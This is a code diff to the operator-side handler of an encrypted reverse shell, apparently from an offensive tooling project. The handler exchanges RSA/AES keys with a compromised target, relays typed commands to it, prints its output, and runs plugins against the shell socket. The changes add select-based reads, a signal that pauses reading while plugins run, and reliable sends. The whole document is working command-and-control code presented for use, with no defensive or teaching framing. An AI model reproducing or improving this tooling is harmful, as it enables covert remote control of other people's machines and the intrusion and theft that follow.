@@ -11,6 +11,7 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 import inspect
 import plugins
+import select
 from socket import *
 import sys
 import threading
@@ -44,13 +45,13 @@ class Handler:
             return
         command = argv[0]
         try:
-            self.plugins[command](argv)
+            self.plugins[command](argv, self.shell, self.cipherKey)
         except KeyError:
             # command not in plugins
             pass
         return
 
-    def sendCommands(self):
+    def sendCommands(self, readSignal):
         command = ""
         while True:
             ch = sys.stdin.read(1)
@@ -60,11 +61,13 @@ class Handler:
                 cipher = AES.new(self.cipherKey, AES.MODE_EAX)
                 nonce = cipher.nonce
                 ciphertext, tag = cipher.encrypt_and_digest(command.encode())
-                self.shell.send(nonce)
-                self.shell.send(tag)
-                self.shell.send(ciphertext)
+                self.shell.sendall(nonce)
+                self.shell.sendall(tag)
+                self.shell.sendall(ciphertext)
                 # check if command was a plugin -- if so, run plugin's handler code
+                readSignal.clear()
                 self.tryPlugin(command)
+                readSignal.set()
                 # record last command to not reprint from target's stdout
                 self.lastCommand = command
                 # close process if shell was exited
@@ -73,30 +76,34 @@ class Handler:
                 # reset input for next command
                 command = ""
 
-    def readResponses(self):
+    def readResponses(self, readSignal):
         while True:
             # end thread if done sending commands
             if self.stopReceiving:
                 break
+            # wait if plugin is being run
+            readSignal.wait()
             # decrypt message
-            nonce = self.shell.recv(16)
-            tag = self.shell.recv(16)
-            ciphertext = self.shell.recv(1)
-            cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
-            response = cipher.decrypt(ciphertext)
-            # print reponse if there is one
-            if len(response) > 0:
-                # don't echo command that was just entered
-                if len(self.lastCommand) > 0:
-                    if len(self.lastCommand) > 1:
-                        self.lastCommand = self.lastCommand[1:]
-                    else:
-                        self.lastCommand = ""
-                    continue
-                try:
-                    print(response.decode(), end="", flush=True)
-                except:
-                    print(".", end="", flush=True)
+            ready, _, _ = select.select([self.shell], [], [], 0)
+            if ready:
+                nonce = self.shell.recv(16)
+                tag = self.shell.recv(16)
+                ciphertext = self.shell.recv(1)
+                cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
+                response = cipher.decrypt(ciphertext)
+                # print reponse if there is one
+                if len(response) > 0:
+                    # don't echo command that was just entered
+                    if len(self.lastCommand) > 0:
+                        if len(self.lastCommand) > 1:
+                            self.lastCommand = self.lastCommand[1:]
+                        else:
+                            self.lastCommand = ""
+                        continue
+                    try:
+                        print(response.decode(), end="", flush=True)
+                    except:
+                        print(".", end="", flush=True)
 
     def getRSA(self):
         # read RSA key if it exists, otherwise create a new one
@@ -120,7 +127,7 @@ class Handler:
 
     def keyExchange(self):
         try:
-            self.shell.send(self.pubKey.exportKey('PEM'))
+            self.shell.sendall(self.pubKey.exportKey('PEM'))
             message = self.shell.recv(1024)
             cipher = PKCS1_OAEP.new(self.privKey)
             aesKey = cipher.decrypt(message)
@@ -152,10 +159,12 @@ class Handler:
         self.privKey, self.pubKey = self.getRSA()
         self.cipherKey = self.keyExchange()
         # start I/O threads to control the reverse shell
-        operatorToShell = threading.Thread(target=self.sendCommands, args=[])
+        readSignal = threading.Event()
+        readSignal.set()
+        operatorToShell = threading.Thread(target=self.sendCommands, args=[readSignal])
         operatorToShell.daemon = True
         operatorToShell.start()
-        shellToOperator = threading.Thread(target=self.readResponses, args=[])
+        shellToOperator = threading.Thread(target=self.readResponses, args=[readSignal])
         shellToOperator.daemon = True
         shellToOperator.start()
         # wait for threads to join
